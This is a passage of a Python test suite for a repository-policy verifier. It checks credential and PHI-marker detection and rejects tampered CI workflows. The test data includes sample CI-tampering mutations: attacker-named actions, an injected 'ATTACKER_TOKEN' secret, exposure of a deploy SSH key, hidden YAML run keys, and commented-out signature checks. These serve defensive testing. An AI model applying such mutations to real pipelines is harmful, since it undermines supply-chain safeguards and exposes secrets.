            ("audit Clinician identifier", "synthetic PHI marker"),
            ("home Facility ID", "synthetic PHI marker"),
            ("home Facility identifier", "synthetic PHI marker"),
            ("auth Tenant ID", "synthetic PHI marker"),
            ("auth Tenant identifier", "synthetic PHI marker"),
            ("actor User ID", "synthetic PHI marker"),
            ("actor User identifier", "synthetic PHI marker"),
            ("source MRN", "synthetic PHI marker"),
        )
        for key, label in sensitive_keys:
            variants = (
                f"{key}: exact-value",
                f"{json.dumps(key)}: # continued\n  exact-value",
            )
            for payload in variants:
                with self.subTest(key=key, payload=payload):
                    self.assert_sensitive_payload_parity(payload, label)

        complementary_variants = (
            ('"DB API key": exact-value', "credential assignment"),
            ("DB API key: # continued\n  exact-value", "credential assignment"),
            ('"service client secret": exact-value', "credential assignment"),
            ("service client secret: # continued\n  exact-value", "credential assignment"),
            ('"source Patient ID": exact-value', "synthetic PHI marker"),
            ("source Patient ID: # continued\n  exact-value", "synthetic PHI marker"),
        )
        for payload, label in complementary_variants:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

    def test_prefixed_spaced_key_near_matches_remain_safe_across_all_paths(self) -> None:
        payload = "\n".join(
            (
                "DB API key note: documented non-sensitive field",
                "service client secretary: documented non-sensitive field",
                "source Patient identity: documented non-sensitive field",
                "audit Clinician identifier note: documented non-sensitive field",
                "home Facility ID policy: documented non-sensitive field",
                "auth Tenant idea: documented non-sensitive field",
                "actor User idempotency: documented non-sensitive field",
                '"DB API key note": documented non-sensitive field',
                '"source Patient identity": documented non-sensitive field',
            )
        )
        self.assert_safe_payload_parity(payload)

    def test_plain_numbered_assignments_have_parity_across_all_scan_paths(self) -> None:
        payloads = (
            ("1. database pass" + "word: exact-value", "credential assignment"),
            ("1) service client " + "secret = exact-value", "credential assignment"),
            ("12. DB API " + "key: exact-value", "credential assignment"),
            ("12) OIDC access " + "token = exact-value", "credential assignment"),
            ("1. source Patient " + "ID: P-123", "synthetic PHI marker"),
            ("1) audit Clinician " + "identifier = C-123", "synthetic PHI marker"),
        )
        for payload, label in payloads:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

    def test_plain_numbered_continuations_have_parity_across_all_scan_paths(self) -> None:
        payloads = (
            ("1. database pass" + "word:\n   exact-value", "credential assignment"),
            ("1) service client " + "secret:\n   exact-value", "credential assignment"),
            ("12. DB API " + "key: # continued\n    exact-value", "credential assignment"),
            ("12) source Patient " + "ID:\n    P-123", "synthetic PHI marker"),
        )
        for payload, label in payloads:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

    def test_numbered_assignment_controls_remain_safe_across_all_scan_paths(self) -> None:
        payloads = (
            "1. The database password policy requires runtime injection.",
            "1) The source Patient ID field is synthetic documentation.",
            "1. database pass" + "word: <redacted>",
            "1) service client " + "secret: ${CLIENT_SECRET}",
            "12. source Patient " + "ID:\n    ${PATIENT_ID}",
            "12) DB API " + "key:\n    <redacted>",
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assert_safe_payload_parity(payload)

    def test_plain_numbered_assignments_are_enforced_end_to_end(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            target = root / "docs" / "numbered-sensitive-assignment.md"
            target.write_text(
                "1. database pass" + "word: <redacted>\n",
                encoding="utf-8",
            )
            MODULE.validate_self_check(root)

            target.write_text(
                "1) service client " + "secret:\n   exact-value\n",
                encoding="utf-8",
            )
            with self.assertRaisesRegex(
                MODULE.PolicyError,
                r"possible credential assignment found in docs/numbered-sensitive-assignment\.md",
            ):
                MODULE.validate_self_check(root)

    def test_markdown_label_continuations_have_parity_all_classes_and_safe_controls(self) -> None:
        exact_payloads = (
            ("**pass" + "word:**\nexact-value", "credential assignment"),
            ("- __client " + "secret:__  \n  \"quoted-value\"", "credential assignment"),
            ("> `Patient " + "ID:`\\\n> P-123", "synthetic PHI marker"),
            ('**"API key":**\nexact-value', "credential assignment"),
            ("- __'client secret':__\n  exact-value", "credential assignment"),
            ('> `"Patient ID":`\n> P-123', "synthetic PHI marker"),
            ("1. **facility " + "identifier:**\n   exact-value", "synthetic PHI marker"),
            ("> - **tenant " + "identifier:**\n>   exact-value", "synthetic PHI marker"),
        )
        for payload, label in exact_payloads:
            with self.subTest(payload=payload):
                self.assert_sensitive_payload_parity(payload, label)

        sensitive_keys = (
            ("password", "credential assignment"),
            ("client secret", "credential assignment"),
            ("API key", "credential assignment"),
            ("access token", "credential assignment"),
            ("Patient ID", "synthetic PHI marker"),
            ("Patient identifier", "synthetic PHI marker"),
            ("Clinician ID", "synthetic PHI marker"),
            ("Clinician identifier", "synthetic PHI marker"),
            ("Facility ID", "synthetic PHI marker"),
            ("Facility identifier", "synthetic PHI marker"),
            ("Tenant ID", "synthetic PHI marker"),
            ("Tenant identifier", "synthetic PHI marker"),
            ("User ID", "synthetic PHI marker"),
            ("User identifier", "synthetic PHI marker"),
            ("MRN", "synthetic PHI marker"),
        )
        for key, label in sensitive_keys:
            payload = f"- **{key}:**\n  exact-value"
            with self.subTest(key=key):
                self.assertEqual(label, MODULE.sensitive_content_label(payload))

        controls = (
            "**pass" + "word:**",
            "- __client " + "secret:__\n",
            "**API " + "key:**\n<redacted>",
            "> `Patient " + "ID:`  \n> ${PATIENT_ID}",
            "> `Tenant " + "ID:`\\\n> ${TENANT_ID}",
            "1. **Facility " + "identifier:**\n   \"${FACILITY_ID}\"",
        )
        for payload in controls:
            with self.subTest(payload=payload):
                self.assertIsNone(MODULE.sensitive_content_label(payload))

    def test_structural_sensitive_values_are_enforced_end_to_end(self) -> None:
        payloads = (
            '{"pass\\u0077ord": {"nested": ["value"]}}',
            "client" + "Secret:\n  - item\n",
            "patient_" + "id:\n  child: value\n",
        )
        for payload in payloads:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                target = root / "docs" / "structural-sensitive-value.md"
                target.write_text(payload, encoding="utf-8")
                with self.assertRaisesRegex(MODULE.PolicyError, "possible"):
                    MODULE.validate_self_check(root)

        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            target = root / "docs" / "safe-empty-sensitive-values.md"
            target.write_text(
                "pass" + "word:\n  # intentionally empty\npatient_" + "id:\n",
                encoding="utf-8",
            )
            MODULE.validate_self_check(root)

    def test_assignment_extraction_match_bound_fails_closed(self) -> None:
        payload = "\n".join(
            f"safe_{index}=null"
            for index in range(MODULE.MAX_ASSIGNMENT_MATCHES + 1)
        )
        with self.assertRaisesRegex(MODULE.PolicyError, "match bound"):
            MODULE.sensitive_content_label(payload)

    def test_json_and_content_scan_bounds_fail_closed(self) -> None:
        with self.assertRaisesRegex(MODULE.PolicyError, "size bound"):
            MODULE.sensitive_content_label(
                "x" * (MODULE.MAX_SENSITIVE_SCAN_CHARS + 1)
            )

        malformed = '{"safe": true, DB_PASS' + "WORD=exposed"
        self.assertEqual(
            "credential assignment", MODULE.sensitive_content_label(malformed)
        )

        with mock.patch.object(MODULE, "MAX_JSON_DEPTH", 2):
            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
                MODULE.sensitive_content_label('{"a":{"b":{"c":null}}}')
        with mock.patch.object(MODULE, "MAX_JSON_NODES", 2):
            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
                MODULE.sensitive_content_label('[null,null]')
        with mock.patch.object(MODULE, "MAX_JSON_CANDIDATES", 2):
            with self.assertRaisesRegex(MODULE.PolicyError, "candidate bound"):
                MODULE.sensitive_content_label("prefix {} middle [] suffix {}")

        deeply_nested = "[" * 2000 + "]" * 2000
        with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
            MODULE.sensitive_content_label(deeply_nested)

    def test_sensitive_scanners_allow_declarations_placeholders_and_prose(self) -> None:
        allowed = (
            "A pass" + "word must never be stored in this repository.",
            "Reject client_" + "secret fields and access token examples.",
            "The patient_" + "id field is prohibited in synthetic documentation.",
            "Use the neutral project identity for source commits.",
            "pass" + "word: null",
            "DB_PASS" + "WORD = NONE # intentionally unset",
            '"MY_API_' + 'KEY": "string",',
            "access" + "Token: str",
            "patient_" + "id:",
            "clinician" + "Id = None",
            '"facility_' + 'identifier": "STRING",',
            "tenant_" + "id: null # populated at runtime",
            "user" + "Identifier = str",
            "M" + "RN: none",
            "DB_PASS" + "WORD: <redacted>",
            "client" + "Secret=${CLIENT_SECRET}",
            "Document access_" + "token handling without assigning a value.",
            "Use a synthetic patient_" + "id in examples without assigning it.",
            "The clientsecretary field is not a client secret assignment.",
            "The apikeynote field documents policy rather than a key.",
            "The patientidentity field is not a patient identifier assignment.",
            "A client secret must never be stored in this repository.",
            "The API key and Patient ID examples are placeholders, not assignments.",
            "Use `client secret` and **Patient ID** only as field names.",
            "`client secret: ${CLIENT_SECRET}`",
            "**API key = <redacted>**",
            "__Patient ID: string__",
            '"facility identifier": null',
        )
        for payload in allowed:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
                root = Path(directory)
                target = root / "docs" / "ordinary.md"
                target.parent.mkdir()
                target.write_text(payload, encoding="utf-8")
                MODULE.scan_sensitive_content(root, MODULE.repository_files(root))
                MODULE.scan_sensitive_bytes("ordinary.md", payload.encode())

    def test_literal_space_keys_and_markdown_assignments_have_scan_path_parity(self) -> None:
        sensitive_keys = (
            ("password", "credential assignment"),
            ("client secret", "credential assignment"),
            ("API key", "credential assignment"),
            ("access token", "credential assignment"),
            ("Patient ID", "synthetic PHI marker"),
            ("Patient identifier", "synthetic PHI marker"),
            ("Clinician ID", "synthetic PHI marker"),
            ("Clinician identifier", "synthetic PHI marker"),
            ("Facility ID", "synthetic PHI marker"),
            ("Facility identifier", "synthetic PHI marker"),
            ("Tenant ID", "synthetic PHI marker"),
            ("Tenant identifier", "synthetic PHI marker"),
            ("User ID", "synthetic PHI marker"),
            ("User identifier", "synthetic PHI marker"),
            ("MRN", "synthetic PHI marker"),
        )
        formats = (
            lambda key: json.dumps({key: "SYNTHETIC-VALUE-123"}),
            lambda key: f"{key}: SYNTHETIC-VALUE-123",
            lambda key: f"`{key} = SYNTHETIC-VALUE-123`",
            lambda key: f"Use **{key}: SYNTHETIC-VALUE-123** only in this example.",
            lambda key: f"__{key} = SYNTHETIC-VALUE-123__",
        )
        fixture = self.load_fixture(SOURCE_ROOT)
        valid_commit = base64.b64decode(
            fixture["sourceCommit"]["rawBase64"], validate=True
        )
        headers, separator, _ = valid_commit.partition(b"\n\n")

        for key, label in sensitive_keys:
            for render in formats:
                payload = render(key)
                with self.subTest(key=key, payload=payload):
                    self.assertEqual(label, MODULE.sensitive_content_label(payload))
                    with tempfile.TemporaryDirectory() as directory:
                        root = self.copy_repository(directory)
                        target = root / "docs" / "literal-space-key.md"
                        target.write_text(payload, encoding="utf-8")
                        with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                            MODULE.validate_self_check(root)

                        mutated = self.load_fixture(root)
                        contents = MODULE.load_published_archive(mutated)
                        contents["README.md"] = payload.encode()
                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
                        self.write_fixture(root, mutated)
                        with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                            MODULE.load_published_fixture(root)

                    commit = headers + separator + payload.encode() + b"\n"
                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                        MODULE.validate_published_commit_headers(commit)

    def test_sensitive_assignment_behavior_is_enforced_end_to_end(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            safe = root / "docs" / "safe-assignment-declarations.md"
            safe.write_text(
                "patient_" + "id: null\n" + "DB_PASS" + "WORD: string\n",
                encoding="utf-8",
            )
            MODULE.validate_self_check(root)
            safe.write_text(
                "patient_" + "id: null\n" + '"MY_API_' + 'KEY": "x"\n',
                encoding="utf-8",
            )
            with self.assertRaisesRegex(
                MODULE.PolicyError,
                r"possible credential assignment found in docs/safe-assignment-declarations\.md",
            ):
                MODULE.validate_self_check(root)

    def test_sensitive_filename_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            (root / "docs" / "credentials.json").write_text("{}")
            with self.assertRaisesRegex(MODULE.PolicyError, "filename"):
                MODULE.validate_self_check(root)

    def test_unpinned_action_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root,
                "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                "actions/checkout@v4",
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "full lowercase"):
                MODULE.validate_workflow_semantics(root)

    def test_local_docker_unknown_and_extra_actions_fail(self) -> None:
        mutations = (
            (
                "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                "docker://alpine:3.20",
            ),
            (
                "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                "./.github/actions/local",
            ),
            (
                "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                "attacker/action@" + "a" * 40,
            ),
            (
                "uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                "uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n"
                "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(
                    MODULE.PolicyError, "uses|action.*allowlist"
                ):
                    MODULE.validate_workflow_semantics(root)

    def test_broad_and_unexpected_job_permissions_fail(self) -> None:
        mutations = (
            ("permissions:\n  contents: read", "permissions: write-all"),
            ("permissions:\n  contents: read", "permissions: read-all"),
            (
                "  gate:\n    if:",
                "  gate:\n    permissions: {}\n    if:",
            ),
            (
                "  gate:\n    if:",
                "  gate:\n    permissions: write-all\n    if:",
            ),
            (
                "    timeout-minutes: 10\n    outputs:",
                "    timeout-minutes: 10\n    permissions:\n      contents: read\n    outputs:",
            ),
            (
                "  gate:\n    if:",
                "  gate: { permissions: write-all }\n  replacement-gate:\n    if:",
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(
                    MODULE.PolicyError, "permissions|flow collections"
                ):
                    MODULE.validate_workflow_semantics(root)

    def test_pr_validation_uses_only_trusted_base_code_against_inert_candidate(self) -> None:
        validation = (
            SOURCE_ROOT / ".github" / "workflows" / "validate-control.yml"
        ).read_text(encoding="utf-8")
        MODULE.validate_control_validation_workflow(validation)
        self.assertNotIn("working-directory: candidate", validation)
        self.assertNotIn("candidate/scripts", validation)
        self.assertNotIn("secrets.", validation)
        self.assertEqual(4, validation.count("persist-credentials: false"))

    def test_checkout_associations_reject_count_preserving_pairwise_swaps(self) -> None:
        pr_trusted = "Checkout trusted base controls"
        pr_candidate = "Checkout pull request head as inert candidate data"
        main_trusted = "Checkout previous trusted main controls"
        main_candidate = "Checkout main candidate data"
        original = (
            SOURCE_ROOT / ".github" / "workflows" / "validate-control.yml"
        ).read_text(encoding="utf-8")
        association_tokens = (
            "repository: ${{ github.repository }}",
            "repository: ${{ github.event.pull_request.head.repo.full_name }}",
            "ref: ${{ github.event.pull_request.base.sha }}",
            "ref: ${{ github.event.pull_request.head.sha }}",
            "ref: ${{ github.event.before }}",
            "ref: ${{ github.sha }}",
            "path: trusted",
            "path: candidate",
        )
        mutations = (
            (pr_trusted, pr_candidate, "repository"),
            (pr_trusted, pr_candidate, "ref"),
            (pr_trusted, pr_candidate, "path"),
            (main_trusted, main_candidate, "ref"),
            (main_trusted, main_candidate, "path"),
        )
        for first, second, field in mutations:
            with self.subTest(
                first=first, second=second, field=field
            ), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.swap_checkout_field(root, first, second, field)
                validation = (
                    root / ".github" / "workflows" / "validate-control.yml"
                ).read_text(encoding="utf-8")
                for token in association_tokens:
                    self.assertEqual(original.count(token), validation.count(token))
                self.assertEqual(4, validation.count("fetch-depth: 1"))
                self.assertEqual(4, validation.count("persist-credentials: false"))
                with self.assertRaisesRegex(
                    MODULE.PolicyError, "exact trust associations"
                ):
                    MODULE.validate_control_validation_workflow(validation)

    def test_main_push_validation_uses_previous_trusted_verifier(self) -> None:
        validation = (
            SOURCE_ROOT / ".github" / "workflows" / "validate-control.yml"
        ).read_text(encoding="utf-8")
        self.assertIn("ref: ${{ github.event.before }}", validation)
        self.assertEqual(1, validation.count("ref: ${{ github.sha }}"))
        self.assertIn(
            "github.event.before != '0000000000000000000000000000000000000000'",
            validation,
        )
        self.assertIn("path: trusted", validation)
        self.assertIn("path: candidate", validation)

    def test_trusted_verifier_never_imports_or_executes_candidate_scripts(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            trusted = self.copy_repository(str(Path(directory) / "trusted"))
            candidate = self.copy_repository(str(Path(directory) / "candidate"))
            self.stage_complete_bundle(
                candidate,
                b'raise RuntimeError("staged candidate code must remain inert")\n',
            )
            result = subprocess.run(
                [
                    sys.executable,
                    str(MODULE_PATH),
                    "--trusted-root",
                    str(trusted),
                    "--candidate-root",
                    str(candidate),
                ],
                cwd=trusted,
                env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"},
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(0, result.returncode, result.stderr)

    def test_pr_validation_trust_boundary_mutations_fail(self) -> None:
        mutations = (
            (
                "ref: ${{ github.event.pull_request.base.sha }}",
                "ref: ${{ github.event.pull_request.head.sha }}",
            ),
            (
                "repository: ${{ github.event.pull_request.head.repo.full_name }}",
                "repository: ${{ github.repository }}",
            ),
            ("path: trusted", "path: candidate"),
            ("working-directory: trusted", "working-directory: candidate"),
            (
                "run: python3 scripts/test_verify_release.py",
                "run: python3 candidate/scripts/test_verify_release.py",
            ),
            (
                'run: python3 scripts/verify_repository_policy.py "$CANDIDATE_ROOT"',
                "run: python3 scripts/verify_repository_policy.py .",
            ),
            ("persist-credentials: false", "persist-credentials: true"),
            ("permissions:\n  contents: read", "permissions:\n  contents: write"),
            (
                'PYTHONDONTWRITEBYTECODE: "1"',
                'ATTACKER_TOKEN: ${{ secrets.ATTACKER_TOKEN }}',
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_named_workflow(root, "validate-control.yml", old, new)
                with self.assertRaises(MODULE.PolicyError):
                    MODULE.validate_workflow_semantics(root)

    def test_authenticity_request_is_required_exact_and_canonical(self) -> None:
        variants = (
            b"not-json\n",
            json.dumps(
                MODULE.verify_authenticity.EXPECTED_REQUEST, sort_keys=True
            ).encode("utf-8"),
            MODULE.verify_authenticity.canonical_bytes(
                {**MODULE.verify_authenticity.EXPECTED_REQUEST, "extra": True}
            ),
        )
        for raw in variants:
            with self.subTest(raw=raw[:20]), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                (root / "authenticity" / "authenticity-request.json").write_bytes(raw)
                with self.assertRaisesRegex(MODULE.PolicyError, "authenticity validation"):
                    MODULE.validate_self_check(root)
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            (root / "authenticity" / "authenticity-request.json").unlink()
            with self.assertRaisesRegex(MODULE.PolicyError, "allowlist"):
                MODULE.validate_self_check(root)

    def test_orphan_or_unconfigured_bundle_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            authenticity = root / "authenticity"
            (authenticity / "authenticity-request.sigstore.json").write_text(
                '{"mediaType":"test"}', encoding="utf-8"
            )
            (authenticity / "authenticity-request.json").unlink()
            with self.assertRaisesRegex(MODULE.PolicyError, "allowlist"):
                MODULE.validate_self_check(root)
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            policy_path = root / "release-control-policy.json"
            policy = json.loads(policy_path.read_text(encoding="utf-8"))
            policy["authenticity"] = {
                "signingConfigured": False,
                "expectedCertificateIdentity": MODULE.verify_authenticity.IDENTITY_PLACEHOLDER,
                "certificateOidcIssuer": MODULE.verify_authenticity.EXPECTED_ISSUER,
            }
            policy_path.write_text(json.dumps(policy), encoding="utf-8")
            (root / "authenticity" / "authenticity-request.sigstore.json").write_text(
                '{"mediaType":"test"}', encoding="utf-8"
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "not configured"):
                MODULE.validate_self_check(root)

    def test_signing_workflow_privilege_upload_and_identity_weakening_fail(self) -> None:
        mutations = (
            ("contents: read", "contents: write"),
            ("persist-credentials: false", "repository: private/example"),
            (
                "${{ runner.temp }}/authenticity-request.sigstore.json",
                "${{ runner.temp }}/authenticity-request.sigstore.json\n"
                "            ${{ runner.temp }}/extra.txt",
            ),
            ("--certificate-identity \"$identity\"", "--certificate-identity-regexp '.*'"),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_signing_workflow(root, old, new)
                with self.assertRaises(MODULE.PolicyError):
                    MODULE.validate_workflow_semantics(root)

    def test_signing_workflow_requires_fail_closed_identity_guard(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_signing_workflow(
                root,
                'test "$identity" != "REPLACE_WITH_EXACT_PUBLIC_REPOSITORY_WORKFLOW_IDENTITY"',
                "true",
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "required control"):
                MODULE.validate_workflow_semantics(root)

    def test_signing_workflow_shell_block_matches_finite_allowlist(self) -> None:
        signing = (
            SOURCE_ROOT / ".github" / "workflows" / "sign-authenticity-request.yml"
        ).read_text(encoding="utf-8")
        self.assertEqual(
            MODULE.expected_signing_shell_blocks(),
            MODULE.active_shell_blocks(signing),
        )
        self.assertEqual(
            MODULE.expected_signing_executable_steps(),
            MODULE.executable_step_inventory(
                signing, "sign-authenticity-request.yml"
            ),
        )
        MODULE.validate_workflows(SOURCE_ROOT)

    def test_signing_workflow_rejects_inline_run_and_shell_inventory_drift(self) -> None:
        mutations = (
            (
                "      - name: Upload request and genuine Sigstore bundle only",
                "      - name: Unexpected inline command\n"
                "        shell: bash\n"
                "        run: true\n\n"
                "      - name: Upload request and genuine Sigstore bundle only",
            ),
            (
                "      - name: Upload request and genuine Sigstore bundle only",
                "      - name: Unexpected block command\n"
                "        shell: bash\n"
                "        run: |\n"
                "          true\n\n"
                "      - name: Upload request and genuine Sigstore bundle only",
            ),
            ("        shell: bash", "        shell: sh"),
            ("        shell: bash\n", ""),
            ("        shell: bash", "        shell: bash\n        shell: bash"),
            ("        shell: bash", "        shell: bash --noprofile --norc"),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_signing_workflow(root, old, new)
                with self.assertRaisesRegex(MODULE.PolicyError, "executable|shell"):
                    MODULE.validate_workflow_semantics(root)

    def test_privileged_workflows_reject_yaml_constructs_that_hide_executable_keys(
        self,
    ) -> None:
        insertion = "      - name: Upload request and genuine Sigstore bundle only"
        mutations = {
            "quoted run": "      - name: Quoted run\n        'run': true\n\n",
            "unicode-escaped run": '      - name: Hidden run\n        "r\\u0075n": true\n\n',
            "unicode-escaped uses": (
                '      - name: Hidden uses\n        "u\\u0073es": attacker/action@main\n\n'
            ),
            "unicode-escaped shell": (
                '      - name: Hidden shell\n        "sh\\u0065ll": bash\n\n'
            ),
            "tagged key": "      - name: Tagged key\n        !evil run: true\n\n",
            "anchor": "      - &hidden\n        run: true\n\n",
            "alias": "      - *hidden\n\n",
            "merge key": "      - name: Merged executable\n        <<: *hidden\n\n",
            "flow mapping": '      - { "r\\u0075n": true }\n\n',
            "flow sequence": "      - [run, true]\n\n",
        }
        for label, hidden_step in mutations.items():
            with self.subTest(label=label), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_signing_workflow(
                    root,
                    insertion,
                    hidden_step + insertion,
                )
                with self.assertRaisesRegex(MODULE.PolicyError, "privileged workflow"):
                    MODULE.validate_workflow_semantics(root)

    def test_signing_workflow_rejects_nonfinite_and_inactive_commands(self) -> None:
        mutations = (
            (
                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"',
                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"\n'
                "          true",
            ),
            (
                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"',
                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"; true',
            ),
            (
                '          cosign sign-blob --yes --bundle "$bundle" "$request"',
                '          cosign sign-blob --yes --bundle "$bundle" "$request" | tee bundle.log',
            ),
            (
                '          cosign verify-blob \\',
                '          # cosign verify-blob\n'
                '          c\\osign verify-blob \\',
            ),
            (
                '          test "$identity" = "https://github.com/$GITHUB_REPOSITORY/'
                '.github/workflows/sign-authenticity-request.yml@refs/heads/main"',
                '          # test "$identity" = "https://github.com/$GITHUB_REPOSITORY/'
                '.github/workflows/sign-authenticity-request.yml@refs/heads/main"',
            ),
            (
                '          cosign sign-blob --yes --bundle "$bundle" "$request"',
                '          # cosign sign-blob --yes --bundle "$bundle" "$request"',
            ),
            (
                '          cosign verify-blob \\',
                '          # cosign verify-blob \\',
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_signing_workflow(root, old, new)
                with self.assertRaisesRegex(MODULE.PolicyError, "finite command allowlist"):
                    MODULE.validate_workflow_semantics(root)

    def test_unsafe_trigger_and_public_self_hosted_runner_fail(self) -> None:
        mutations = (
            ("workflow_dispatch:", "pull_request_target:"),
            ("runs-on: ubuntu-latest", "runs-on: self-hosted"),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(MODULE.PolicyError, "unsafe"):
                    MODULE.validate_workflow_semantics(root)

    def test_dynamic_environment_and_gate_secret_fail(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root, "environment:\n      name: staging", "environment: ${{ inputs.environment }}"
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "required control|static"):
                MODULE.validate_workflow_semantics(root)
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root,
                "GH_TOKEN: ${{ github.token }}",
                "GH_TOKEN: ${{ secrets.DEPLOY_SSH_PRIVATE_KEY }}",
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "gate"):
                MODULE.validate_workflow_semantics(root)

    def test_runtime_host_enrollment_and_unknown_secret_fail(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root,
                "printf '%s\\n' \"$DEPLOY_KNOWN_HOSTS\" > \"$known_hosts\"",
                "ssh-keyscan \"$DEPLOY_HOST\" > \"$known_hosts\"",
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "unsafe"):
                MODULE.validate_workflow_semantics(root)
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root,
                "DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}",
                "DEPLOY_HOST: ${{ secrets.UNSCOPED_TOKEN }}",
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "allowlist"):
                MODULE.validate_workflow_semantics(root)

    def test_missing_static_environment_and_token_permission_fail(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root, "environment:\n      name: prod", "environment:\n      name: production"
            )
            with self.assertRaisesRegex(MODULE.PolicyError, "required control"):
                MODULE.validate_workflow_semantics(root)
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(root, "permissions: {}", "permissions:\n      contents: write")
            with self.assertRaisesRegex(MODULE.PolicyError, "permissions"):
                MODULE.validate_workflow_semantics(root)

    def test_deploy_authenticity_gate_cannot_be_commented_out(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            self.mutate_workflow(
                root,
                "          python3 scripts/verify_authenticity.py \\\n"
                "            --request authenticity/authenticity-request.json \\\n"
                "            --bundle authenticity/authenticity-request.sigstore.json \\\n"
                "            --policy release-control-policy.json \\\n"
                "            --cosign cosign",
                "          # python3 scripts/verify_authenticity.py \\\n"
                "          # --request authenticity/authenticity-request.json \\\n"
                "          # --bundle authenticity/authenticity-request.sigstore.json \\\n"
                "          # --policy release-control-policy.json \\\n"
                "          # --cosign cosign",
            )
            with self.assertRaisesRegex(
                MODULE.PolicyError, "actively verify|finite command allowlist"
            ):
                MODULE.validate_workflow_semantics(root)

    def test_current_workflow_shell_blocks_match_finite_allowlist(self) -> None:
        deploy = (
            SOURCE_ROOT / ".github" / "workflows" / "deploy-approved-release.yml"
        ).read_text(encoding="utf-8")
        self.assertEqual(
            MODULE.expected_deployment_shell_blocks(),
            MODULE.active_shell_blocks(deploy),
        )
        self.assertEqual(
            MODULE.expected_deployment_executable_steps(),
            MODULE.executable_step_inventory(
                deploy, "deploy-approved-release.yml"
            ),
        )
        MODULE.validate_workflows(SOURCE_ROOT)

    def test_deployment_workflow_rejects_inline_run_and_shell_inventory_drift(self) -> None:
        mutations = (
            (
                "      - name: Deploy approved staging candidate",
                "      - name: Unexpected inline command\n"
                "        shell: bash\n"
                "        run: true\n\n"
                "      - name: Deploy approved staging candidate",
            ),
            (
                "      - name: Deploy approved staging candidate",
